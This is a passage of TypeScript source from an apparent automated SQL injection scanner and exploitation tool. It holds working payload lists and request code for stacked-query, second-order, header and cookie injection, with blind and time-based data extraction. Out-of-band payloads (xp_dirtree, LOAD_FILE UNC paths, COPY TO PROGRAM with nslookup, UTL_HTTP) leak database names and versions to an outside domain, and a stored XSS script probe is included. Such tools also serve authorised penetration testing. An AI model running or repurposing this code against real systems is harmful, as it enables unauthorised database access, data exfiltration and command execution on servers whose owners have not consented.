    // MSSQL: stacked queries work natively
    { payload: "'; WAITFOR DELAY '0:0:3'-- -", dbms: 'mssql', verify: res => res.time > 2500 },
    { payload: "1; WAITFOR DELAY '0:0:3'-- -", dbms: 'mssql', verify: res => res.time > 2500 },
    { payload: "'); WAITFOR DELAY '0:0:3'-- -", dbms: 'mssql', verify: res => res.time > 2500 },

    // PostgreSQL: supports stacked queries
    { payload: "'; SELECT pg_sleep(3)-- -", dbms: 'postgresql', verify: res => res.time > 2500 },
    { payload: "1; SELECT pg_sleep(3)-- -", dbms: 'postgresql', verify: res => res.time > 2500 },

    // MySQL: limited stacked query support (mysqli_multi_query)
    { payload: "'; SELECT SLEEP(3)-- -", dbms: 'mysql', verify: res => res.time > 2500 },
    { payload: "'; SELECT SLEEP(3)#", dbms: 'mysql', verify: res => res.time > 2500 },

    // SQLite: supports stacked
    { payload: "'; SELECT CASE WHEN 1=1 THEN '' ELSE ZEROBLOB(100000000) END-- -", dbms: 'sqlite', verify: res => res.statusCode < 500 },
];

export async function detectStackedQueries(config: AdaptiveConfig): Promise<StackedQueryResult> {
    for (const probe of STACKED_PROBES) {
        // Try with smart mutation if plain fails
        const result = await smartMutate(config, probe.payload);
        if (!result) continue;

        const res = await sendAdaptive(config, result.payload);
        if (res && probe.verify(res)) {
            return {
                supported: true,
                dbms: probe.dbms,
                evidence: `Stacked query confirmed (${probe.dbms}). Delay: ${res.time}ms. Payload: ${result.payload}`,
                payload: result.payload,
            };
        }
    }

    return { supported: false, dbms: 'unknown', evidence: 'No stacked query support detected', payload: '' };
}

// ============================================================
// SECOND-ORDER SQLi DETECTION
// Inject payload in one endpoint, trigger in another
// ============================================================

export interface SecondOrderResult {
    detected: boolean;
    injectUrl: string;
    triggerUrl: string;
    payload: string;
    evidence: string;
}

const SECOND_ORDER_MARKERS = [
    { marker: "IPF_2ND_", payload: "' OR '1'='1", type: 'auth-bypass' },
    { marker: "IPF_XSS_2ND_", payload: "<script>document.title='IPF_2ND_FOUND'</script>", type: 'stored-xss-to-sqli' },
    { marker: "IPF_ERR_2ND_", payload: "' AND ExtractValue(1,CONCAT(0x7e,'IPF_2ND_OK'))-- -", type: 'error-trigger' },
    { marker: "IPF_SLEEP_2ND_", payload: "' OR SLEEP(3)-- -", type: 'time-trigger' },
];

export async function detectSecondOrder(
    config: AdaptiveConfig,
    triggerUrls: string[],
): Promise<SecondOrderResult | null> {
    const uniqueId = Math.random().toString(36).slice(2, 8);

    for (const so of SECOND_ORDER_MARKERS) {
        const marker = so.marker + uniqueId;
        const payload = so.payload.replace(/IPF_2ND_/g, marker);

        // Step 1: Inject the payload via the injection point
        await sendAdaptive(config, payload);

        // Step 2: Visit trigger URLs and look for the marker or timing anomaly
        for (const triggerUrl of triggerUrls) {
            try {
                const start = Date.now();
                const triggerRes = await fetch(triggerUrl, {
                    headers: {
                        'User-Agent': config.userAgent,
                        ...config.customHeaders,
                        ...config.authHeaders,
                    },
                    signal: AbortSignal.timeout(config.timeout),
                    redirect: 'follow',
                });
                const elapsed = Date.now() - start;
                const body = await triggerRes.text();

                // Check for marker in response
                if (body.includes(marker)) {
                    return {
                        detected: true,
                        injectUrl: config.baseUrl,
                        triggerUrl,
                        payload,
                        evidence: `Second-order SQLi confirmed! Marker "${marker}" found in trigger URL. Type: ${so.type}`,
                    };
                }

                // Check for timing anomaly (sleep-based second-order)
                if (so.type === 'time-trigger' && elapsed > 2500) {
                    return {
                        detected: true,
                        injectUrl: config.baseUrl,
                        triggerUrl,
                        payload,
                        evidence: `Second-order time-based SQLi! Trigger delay: ${elapsed}ms. Type: ${so.type}`,
                    };
                }

                // Check for SQL error in trigger response
                if (/SQL.*error|syntax.*error|unterminated|ORA-\d{5}/i.test(body)) {
                    return {
                        detected: true,
                        injectUrl: config.baseUrl,
                        triggerUrl,
                        payload,
                        evidence: `Second-order error-based SQLi! SQL error appeared in trigger URL. Type: ${so.type}`,
                    };
                }
            } catch {
                // timeout or error — could be sleep-based
                if (so.type === 'time-trigger') {
                    return {
                        detected: true,
                        injectUrl: config.baseUrl,
                        triggerUrl,
                        payload,
                        evidence: `Second-order time-based SQLi! Trigger URL timed out after injection. Type: ${so.type}`,
                    };
                }
            }
        }
    }

    return null;
}

// ============================================================
// COOKIE / HEADER / JSON INJECTION ENGINE
// ============================================================

export async function scanHeaderInjection(
    url: string,
    config: Omit<AdaptiveConfig, 'baseUrl' | 'paramName' | 'vector'>,
): Promise<Array<{ vector: string; header: string; vulnerable: boolean; evidence: string }>> {
    const results: Array<{ vector: string; header: string; vulnerable: boolean; evidence: string }> = [];

    const INJECTABLE_HEADERS = [
        { name: 'Cookie', values: (p: string) => `session=${p}; token=${p}` },
        { name: 'Referer', values: (p: string) => `${url}?ref=${p}` },
        { name: 'X-Forwarded-For', values: (p: string) => p },
        { name: 'X-Forwarded-Host', values: (p: string) => p },
        { name: 'User-Agent', values: (p: string) => p },
        { name: 'Accept-Language', values: (p: string) => p },
        { name: 'X-Custom-IP-Authorization', values: (p: string) => p },
        { name: 'X-Original-URL', values: (p: string) => `/${p}` },
        { name: 'X-Rewrite-URL', values: (p: string) => `/${p}` },
        { name: 'X-Client-IP', values: (p: string) => p },
        { name: 'X-Real-IP', values: (p: string) => p },
        { name: 'True-Client-IP', values: (p: string) => p },
    ];

    const HEADER_PROBES = [
        "' OR 1=1-- -",
        "' AND SLEEP(3)-- -",
        "1' OR '1'='1",
        "' UNION SELECT NULL-- -",
    ];

    // Get baseline response
    let baselineLen = 0;
    try {
        const baseRes = await fetch(url, {
            headers: { 'User-Agent': config.userAgent, ...config.customHeaders, ...config.authHeaders },
            signal: AbortSignal.timeout(config.timeout),
        });
        const baseBody = await baseRes.text();
        baselineLen = baseBody.length;
    } catch { return results; }

    for (const hdr of INJECTABLE_HEADERS) {
        for (const probe of HEADER_PROBES) {
            try {
                const headers: Record<string, string> = {
                    'User-Agent': config.userAgent,
                    ...config.customHeaders,
                    ...config.authHeaders,
                    [hdr.name]: hdr.values(probe),
                };

                const start = Date.now();
                const res = await fetch(url, {
                    headers,
                    signal: AbortSignal.timeout(config.timeout),
                    redirect: 'follow',
                });
                const elapsed = Date.now() - start;
                const body = await res.text();

                // Check for SQL errors
                const hasError = /SQL.*syntax|mysql_|PostgreSQL.*ERROR|ORA-\d{5}|ODBC.*SQL|unterminated/i.test(body);
                const hasTiming = probe.includes('SLEEP') && elapsed > 2500;
                const hasDiff = Math.abs(body.length - baselineLen) > 100;

                if (hasError || hasTiming || hasDiff) {
                    results.push({
                        vector: 'header',
                        header: hdr.name,
                        vulnerable: true,
                        evidence: hasError ? `SQL error in response via ${hdr.name}` :
                            hasTiming ? `Time delay ${elapsed}ms via ${hdr.name}` :
                                `Response length diff ${Math.abs(body.length - baselineLen)} via ${hdr.name}`,
                    });
                    break; // found for this header, move to next
                }
            } catch {
                // timeout during SLEEP probe = potential vuln
                if (probe.includes('SLEEP')) {
                    results.push({
                        vector: 'header',
                        header: hdr.name,
                        vulnerable: true,
                        evidence: `Timeout during SLEEP probe via ${hdr.name} header — likely time-blind SQLi`,
                    });
                    break;
                }
            }
        }
    }

    return results;
}

// ============================================================
// RESPONSE DIFF ENGINE
// Statistical comparison for blind detection
// ============================================================

export interface ResponseSignature {
    length: number;
    wordCount: number;
    statusCode: number;
    titleHash: string;
    contentHash: string;
    headerSignature: string;
    time: number;
}

export function buildSignature(body: string, statusCode: number, headers: Record<string, string>, time: number): ResponseSignature {
    const titleMatch = body.match(/<title[^>]*>([^<]*)<\/title>/i);
    const title = titleMatch?.[1]?.trim() || '';
    // Simple hash: take first 100 chars + length as fingerprint
    const contentSample = body.replace(/<[^>]+>/g, '').trim().slice(0, 200);

    return {
        length: body.length,
        wordCount: body.split(/\s+/).length,
        statusCode,
        titleHash: simpleHash(title),
        contentHash: simpleHash(contentSample),
        headerSignature: simpleHash(JSON.stringify(Object.keys(headers).sort())),
        time,
    };
}

export function signatureDiff(a: ResponseSignature, b: ResponseSignature): number {
    let score = 0;
    // Length difference ratio
    const lenRatio = Math.abs(a.length - b.length) / Math.max(a.length, b.length, 1);
    score += lenRatio * 40; // up to 40 points

    // Word count diff ratio
    const wcRatio = Math.abs(a.wordCount - b.wordCount) / Math.max(a.wordCount, b.wordCount, 1);
    score += wcRatio * 20;

    // Status code diff
    if (a.statusCode !== b.statusCode) score += 25;

    // Title diff
    if (a.titleHash !== b.titleHash) score += 10;

    // Content hash diff
    if (a.contentHash !== b.contentHash) score += 5;

    return Math.min(score, 100);
}

function simpleHash(str: string): string {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        const ch = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + ch;
        hash |= 0;
    }
    return hash.toString(36);
}

// ============================================================
// CONTEXT-AWARE PAYLOAD BUILDER
// Builds payloads adapted to detected SQL context
// ============================================================

export function buildContextPayload(
    expr: string,
    ctx: ContextFingerprint,
    technique: 'union' | 'error' | 'blind' | 'time' | 'stacked',
    columnCount: number = 1,
    injectableCol: number = 1,
): string {
    const close = ctx.closingChars;
    const comment = ctx.commentStyle;

    switch (technique) {
        case 'union': {
            const cols = Array(columnCount).fill('NULL');
            const marker = `IPX_${Math.random().toString(36).slice(2, 6)}`;
            cols[injectableCol - 1] = `CONCAT('${marker}_',${expr})`;
            return `${close} UNION SELECT ${cols.join(',')}${comment}`;
        }
        case 'error': {
            switch (ctx.dbms) {
                case 'mysql': return `${close} AND ExtractValue(1,CONCAT(0x7e,(${expr}),0x7e))${comment}`;
                case 'mssql': return `${close} AND 1=CONVERT(int,(${expr}))${comment}`;
                case 'postgresql': return `${close} AND 1=CAST((${expr}) AS integer)${comment}`;
                case 'oracle': return `${close} AND 1=CTXSYS.DRITHSX.SN(1,(${expr}))${comment}`;
                default: return `${close} AND 1=CAST((${expr}) AS integer)${comment}`;
            }
        }
        case 'blind': {
            return `${close} AND ASCII(SUBSTRING((${expr}),1,1))>64${comment}`;
        }
        case 'time': {
            const sleep = ctx.dbms === 'mysql' ? 'SLEEP(3)' :
                ctx.dbms === 'mssql' ? "WAITFOR DELAY '0:0:3'" :
                    ctx.dbms === 'postgresql' ? 'pg_sleep(3)' : 'SLEEP(3)';
            return `${close} AND IF(ASCII(SUBSTRING((${expr}),1,1))>64,${sleep},0)${comment}`;
        }
        case 'stacked': {
            return `${close}; SELECT ${expr}${comment}`;
        }
        default:
            return `${close} AND 1=CAST((${expr}) AS integer)${comment}`;
    }
}

// ============================================================
// OUT-OF-BAND (OOB) DETECTION HINTS
// ============================================================

export function buildOobPayloads(domain: string, dbms: string): string[] {
    if (!domain) return [];

    const payloads: string[] = [];
    const token = Math.random().toString(36).slice(2, 8);

    if (dbms === 'mysql' || dbms === 'unknown') {
        payloads.push(`' AND LOAD_FILE(CONCAT('\\\\\\\\',database(),'.${token}.${domain}\\\\x'))-- -`);
        payloads.push(`' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.${token}.${domain}\\\\x'))-- -`);
    }
    if (dbms === 'mssql' || dbms === 'unknown') {
        payloads.push(`'; EXEC master..xp_dirtree '\\\\${token}.${domain}\\x'-- -`);
        payloads.push(`'; EXEC master..xp_subdirs '\\\\${token}.${domain}\\x'-- -`);
        payloads.push(`'; DECLARE @q varchar(1024); SET @q='\\\\'+DB_NAME()+'.${token}.${domain}\\x'; EXEC master..xp_dirtree @q-- -`);
    }
    if (dbms === 'postgresql' || dbms === 'unknown') {
        payloads.push(`'; COPY (SELECT '') TO PROGRAM 'nslookup ${token}.${domain}'-- -`);
        payloads.push(`' AND 1=1; CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host=${token}.${domain} dbname=x')-- -`);
    }
    if (dbms === 'oracle' || dbms === 'unknown') {
        payloads.push(`' AND UTL_HTTP.REQUEST('http://${token}.${domain}/') IS NOT NULL-- -`);
        payloads.push(`' AND DBMS_LDAP.INIT(('${token}.${domain}'),80) IS NOT NULL-- -`);
    }

    return payloads;
}

// ============================================================
// HTTP HELPER — Adaptive Request Engine
// Supports all injection vectors
// ============================================================

interface AdaptiveResponse {
    body: string;
    statusCode: number;
    headers: Record<string, string>;
    time: number;
}

async function sendAdaptive(config: AdaptiveConfig, payload: string): Promise<AdaptiveResponse | null> {
    try {
        const headers: Record<string, string> = {
            'User-Agent': config.userAgent,
            ...config.customHeaders,
            ...config.authHeaders,
        };

        let fetchUrl = config.baseUrl;
        let fetchBody: string | undefined;
        let method = config.method;

        switch (config.vector) {
            case 'query': {
                const u = new URL(config.baseUrl);
                u.searchParams.set(config.paramName, payload);
                fetchUrl = u.toString();
                break;
            }
            case 'body': {
                headers['Content-Type'] = 'application/x-www-form-urlencoded';
                fetchBody = `${config.paramName}=${encodeURIComponent(payload)}`;
                break;
            }
            case 'json-body': {
                headers['Content-Type'] = 'application/json';
                fetchBody = JSON.stringify({ [config.paramName]: payload });
                break;
            }
            case 'xml-body': {
                headers['Content-Type'] = 'application/xml';
                fetchBody = `<${config.paramName}>${payload}</${config.paramName}>`;
                break;
            }
            case 'cookie': {
                headers['Cookie'] = `${config.paramName}=${encodeURIComponent(payload)}${config.authCookies ? '; ' + config.authCookies : ''}`;
                break;
            }
            case 'header': {
                headers[config.paramName] = payload;
                break;
            }
            case 'path': {
                fetchUrl = config.baseUrl.replace(encodeURIComponent(config.paramName), encodeURIComponent(payload));
                break;
            }
            default: {
                const u2 = new URL(config.baseUrl);
                u2.searchParams.set(config.paramName, payload);
                fetchUrl = u2.toString();
            }
        }

        const start = Date.now();
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), config.timeout);

        const response = await fetch(fetchUrl, {
            method,
            headers,
            body: fetchBody,
            signal: controller.signal,
            redirect: 'follow',
        });
        clearTimeout(timeoutId);

        const body = await response.text();
        const respHeaders: Record<string, string> = {};
        response.headers.forEach((v, k) => { respHeaders[k] = v; });

        return {
            body,
            statusCode: response.status,
            headers: respHeaders,
            time: Date.now() - start,
        };
    } catch {
        return null;
    }
}
